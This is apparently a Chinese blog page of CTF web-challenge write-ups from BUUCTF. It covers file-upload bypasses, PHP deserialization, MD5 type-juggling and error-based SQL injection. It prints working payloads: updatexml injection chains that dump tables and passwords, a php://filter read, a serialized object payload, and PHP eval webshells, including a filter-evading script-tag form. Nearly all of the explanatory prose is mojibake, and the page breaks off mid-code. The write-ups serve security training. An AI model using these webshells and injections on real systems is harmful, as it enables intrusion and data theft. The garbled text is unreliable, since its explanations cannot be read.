<h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h3><p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯ç•Œé¢ã€æ”¹å˜æ–‡ä»¶æ‹“å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½<br>è¿™é‡Œhtaccesså†…å®¹çš„æ„æ€æ˜¯è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æ</p>
<p>è¿™é‡Œè¦è®°å¾—æŠŠContent-Typeçš„å†…å®¹ä¿®æ”¹ä¸€ä¸‹<br><img src="/images/Y7CUL3CBL.png" srcset="/img/loading.gif" lazyload><br>å¤åˆ¶&#x2F;uploadä¹‹åçš„urlå¹¶è¿›å…¥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>:http://c59ecfdc-<span class="hljs-number">0</span>a3d-<span class="hljs-number">4</span>ed6-<span class="hljs-number">92</span>d7-<span class="hljs-number">74</span>b6bcc602d4.node4.buuoj.cn:<span class="hljs-number">81</span>/upload/<span class="hljs-number">7</span>a439cdf1a27a4860163c7641f0dc7fe/<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥postè¾“å…¥å‘½ä»¤</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>print_r(glob(<span class="hljs-string">&quot;/*&quot;</span>))<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>ä»¥è·å–flag</p>
<p>æˆ–ä»¥å½“å‰urlè¿æ¥ä¸­å›½èšå‰‘ï¼Œä»¥è·å–flag</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€æ®µæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œéƒ½éœ€è¦é€šè¿‡GETæ–¹å¼ä¼ å…¥<br>issetçš„ä½œç”¨æ˜¯æ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”énull<br>file_get_contentsçš„ä½œç”¨æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²<br>è¿™é‡Œå°†textæ–‡ä»¶ä¸­è¯»å–å­—ç¬¦ä¸²ï¼Œè¿˜è¦å’Œwelcome to the zjctfç›¸ç­‰<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯data:&#x2F;&#x2F;å†™å…¥åè®®<br>payloadï¼š</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure>

<p><img src="/images/DKORO.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>)</span></span><br></code></pre></td></tr></table></figure>

<p>æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¯´æ˜fileä¸èƒ½å‡ºç°flagå­—ç¬¦<br>ä½†æ˜¯æºç æç¤ºäº†useless.phpè¿™é‡Œä½¿ç”¨phpä¼ªåè®®æ¥è¯»å–æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
<p><img src="/images/G3HD33.png" srcset="/img/loading.gif" lazyload></p>
<p>ä½¿ç”¨base64è§£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ€åä¼šechoè¾“å‡ºfile<br>å°†flag.phpçš„å€¼ç»™äº†fileï¼Œç„¶åååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨phpç¼–è¯‘å™¨phpstorm<br><img src="/images/TMK81DK.png" srcset="/img/loading.gif" lazyload><br>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br></code></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºç å³å¯çœ‹åˆ°flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL 1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL 1</h2><p>sqlæ³¨å…¥é¢˜ï¼Œå…ˆè¯•è¯•ä¸‡èƒ½å¯†ç username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123<br><img src="/images/4RO.png" srcset="/img/loading.gif" lazyload><br>ç»è¿‡ä¸€ç³»åˆ—å°è¯•åï¼Œå‘ç°ç©ºæ ¼ï¼Œ&#x3D;ï¼Œunionéƒ½è¢«è¿‡æ»¤äº†<br>ç©ºæ ¼è¢«è¿‡æ»¤æˆ‘ä»¬ä½¿ç”¨()æ¥ä»£æ›¿ç©ºæ ¼&#x2F;**&#x2F;è²Œä¼¼ä¹Ÿè¢«è¿‡æ»¤äº†<br>æ—¢ç„¶å¦‚æ­¤ï¼Œå°è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥<br><strong>çˆ†åº“</strong><br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/YKR.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>çˆ†è¡¨</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/VNTXAGU.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>çˆ†å­—æ®µ</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/16B3IU.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>çˆ†å€¼</strong><br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br><img src="/images/M3HJZ8NQ67JFV.png" srcset="/img/loading.gif" lazyload><br>å¹¶æ²¡æœ‰æˆåŠŸæ˜¾ç¤ºflagï¼Œåªæ˜¾ç¤ºäº†ä¸€åŠ~<br>ç»è¿‡æŸ¥è¯¢çŸ¥é“äº†right()å¯ä»¥æŸ¥è¯¢åé¢çš„éƒ¨åˆ†<br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>å’Œå‰é¢æ˜¾ç¤ºå‡ºçš„flagæ‹¼æ¥åˆ æ”¹å¾—åˆ°å®Œæ•´çš„flag</p>
<h2 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h2><p>ç›´æ¥ç»™å‡ºæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br>Please input first<br><br></code></pre></td></tr></table></figure>


<p>å‘ç°ç¬¬äº”ä¸ªifå¯ä»¥è·å¾—flag<br>å…ˆç¬¬ä¸€ä¸ªif<br><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;]))</code><br>issetæ£€æŸ¥æ˜¯å¦æœ‰æ•ˆï¼Œéšä¾¿è¾“ä¸€ä¸ªå­—ç¬¦å°±èƒ½é€šè¿‡<br>ç¬¬äºŒä¸ªif<br><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code><br>ç»•è¿‡è¿™ä¸ªifè¦å…ˆæƒ³åˆ°MD5æ¼æ´ï¼Œæˆ‘å…ˆæƒ³åˆ°çš„æ˜¯0eå¼€å¤´çš„æ¼æ´<br>ps:md5 å€¼æ˜¯ 0e å¼€å¤´ï¼Œåœ¨ php å¼±ç±»å‹æ¯”è¾ƒä¸­åˆ¤æ–­ä¸ºç›¸ç­‰<br>å†çœ‹å›æ¥ï¼Œå¼±æ¯”è¾ƒæ˜¯&#x3D;&#x3D;ï¼Œè€Œæœ¬é¢˜ä¸­æ˜¯&#x3D;&#x3D;&#x3D;å¼ºæ¯”è¾ƒï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è¿™ä¸ªç»•è¿‡<br>åœ¨æŸ¥é˜…åå‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•â€”â€”æ•°ç»„ç»•è¿‡<code>a[]=a&amp;b[]=b</code><br>è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†åˆ¤æ–­ä¸ºçœŸï¼Œåˆ¤æ–­ä¸ºnull&#x3D;&#x3D;&#x3D;null<br>è€Œä¸”id!&#x3D;gg<br>payload:<code>?gg[]=gg&amp;id[]=id</code><br><img src="/images/XNP4L0FHEL.png" srcset="/img/loading.gif" lazyload><br>You got the first steponly one way to get the flag</p>
<p>å¾—åˆ°äº†æˆ‘ä»¬éœ€è¦çš„ç»“æœyou got the first step<br>ä½†å¤šå‡ºæ¥ä¸€å¥ only one way to get the flag<br>æŸ¥çœ‹æºä»£ç å‘ç°æ˜¯è¿™ä¸€å¥æ˜¯ç¬¬ä¸‰ä¸ªifçš„elseè¯­å¥ï¼Œè¯´æ˜ç¬¬ä¸‰ä¸ªifå¹¶æœªç»•è¿‡ï¼Œ<br><code>if(isset($_POST[&#39;passwd&#39;]))</code><br>åŒæ ·éšä¾¿postä¸€ä¸ªå­—ç¬¦å°±èƒ½ç»•è¿‡</p>
<p>å†çœ‹ç¬¬å››ä¸ªif<br><code>if (!is_numeric($passwd))</code><br>is_numeric()å‡½æ•°æ˜¯æ£€æµ‹æ˜¯å¦ä¸ºæ•°å­—å­—ç¬¦ï¼Œæ˜¯åˆ™ture<br>è¿™é‡Œä¸º!is_numeric()ï¼Œå°±æ˜¯ä¸èƒ½å…¨ä¸ºæ•°å­—å­—ç¬¦<br>åŒæ—¶æˆ‘ä»¬çœ‹å‘ç¬¬äº”ä¸ªif<br><code>if($passwd==1234567)</code><br>ä¸ç¬¬å››ä¸ªifç›¸åï¼Œè¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªifæ¡ä»¶æ‰èƒ½è·å¾—flag<br>å…ˆè¯•ç€æŠŠ1234567è½¬åŒ–ä¸º16è¿›åˆ¶<br>passwd&#x3D;12D687<br>æäº¤ååªç»•è¿‡äº†ç¬¬å››ä¸ªifï¼Œä¸è¡Œ<br>ç™¾åº¦ä¸€ä¸‹å‘ç°<br><img src="/images/20210407185102246.png" srcset="/img/loading.gif" lazyload><br>passwd:1234567%00<br>passwd:1234567%20<br>æˆåŠŸå¾—åˆ°flag<br><img src="/images/CJBVJ1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>è¿›å…¥é¡µé¢ï¼Œå…ˆæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æºä»£ç é‡Œæœ‰æ³¨é‡Šyou are not admin<br>flagåº”è¯¥åœ¨adminä¸­ï¼Œçœ‹åˆ°å³è¾¹æœ‰registerå’Œloginï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªçœ‹çœ‹ä»€ä¹ˆæ•ˆæœ<br>ç™»å½•è¿›å»å‘ç°å¤šäº†å‡ ä¸ªé€‰é¡¹<br><img src="/images/GK.png" srcset="/img/loading.gif" lazyload></p>
<p>æŒ¨ä¸ªæŸ¥çœ‹æºä»£ç <br><img src="/images/9DRO.png" srcset="/img/loading.gif" lazyload><br>å‘ç°åœ¨change passwordä¸­çš„æºä»£ç ä¸å…¶ä»–ä¸åŒï¼Œæ˜¾ç¤ºäº†ä¸€ä¸ªgithubç½‘å€ï¼Œè¿›å…¥æŸ¥çœ‹ç½‘é¡µç«Ÿç„¶ä¸å­˜åœ¨ï¼Œé‚£å°±æ¢ä¸€ç§æ–¹æ³•ï¼Œregisteræ³¨å†Œä¸€ä¸ªadminï¼Œæ˜¾ç¤ºå·²è¢«æ³¨å†Œï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•è¯•ç›´æ¥login adminï¼Œå¯†ç éšæ„ï¼Œç«Ÿç„¶æˆåŠŸäº†<br><img src="/images/9WKWG.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ˜¾ç¤ºflagï¼Œåç»­ä¼šè·Ÿè¿›å…¶ä»–æ–¹æ³•</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª.user.ini å†…å®¹ä¸ºauto_prepend_file&#x3D;12.txt<br>ä¸Šä¼ å¤±è´¥ï¼Œæ˜¾ç¤ºexif_imagetype:not image!ï¼Œæ²¡æœ‰å›¾åƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶å¹»æœ¯å¤´ç»•è¿‡<br><img src="/images/1UZPE.png" srcset="/img/loading.gif" lazyload><br>å†æ¬¡ä¸Šä¼ ï¼ŒæˆåŠŸ<br><img src="/images/VT8D.png" srcset="/img/loading.gif" lazyload><br>å†ä¸Šä¼ ä¸€ä¸ªå¸¸ç”¨çš„æœ¨é©¬æ–‡ä»¶<br>ä¸Šä¼ é”™è¯¯ï¼Œæ˜¾ç¤º&lt;? in contents!<br>å±è”½äº†ä¸€äº›ç¬¦å·å¯¼è‡´æ— æ³•ä¸Šä¼ <br>æ¢ç§æ–¹æ³•ä¸Šä¼ <br><img src="/images/8BNM.png" srcset="/img/loading.gif" lazyload><br>è¿™æ¬¡æˆåŠŸä¸Šä¼ <br><img src="/images/G3.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥ç»™å‡ºçš„åœ°å€<br>å…ˆè¾“å…¥a&#x3D;phpinfo()è¯•è¯•èƒ½ä¸èƒ½è¿è¡Œå‘½ä»¤<br><img src="/images/P45UMTRF.png" srcset="/img/loading.gif" lazyload><br>æœ‰å›æ˜¾ï¼ŒæˆåŠŸæ‰§è¡Œ<br>ç»§ç»­post a&#x3D;system(â€œcat &#x2F;flagâ€)<br><img src="/images/U5SYBY1GKWV.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ˜¾ç¤ºflag</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>ä¸Šä¼ .htaccess(ä»¥jpgå½¢å¼æŠ“åŒ…ä¿®æ”¹åç¼€å)<br><img src="/images/8HOSK.png" srcset="/img/loading.gif" lazyload><br>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¤±è´¥ï¼Œè¿‡æ»¤äº†&lt;?<br>æ¢ä¸€ç§æ–¹å¼</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ä»¥æ‰¾åˆ°flag</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>é¦–å…ˆåœ¨é¶æœºé¡µé¢é‡Œä»–ç»™äº†ä¸ªgithubç½‘å€ï¼Œè¿›å…¥åœ¨web&#x2F;babysqli&#x2F;html&#x2F;search.phpé‡Œæ‰¾åˆ°é‡è¦æºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs 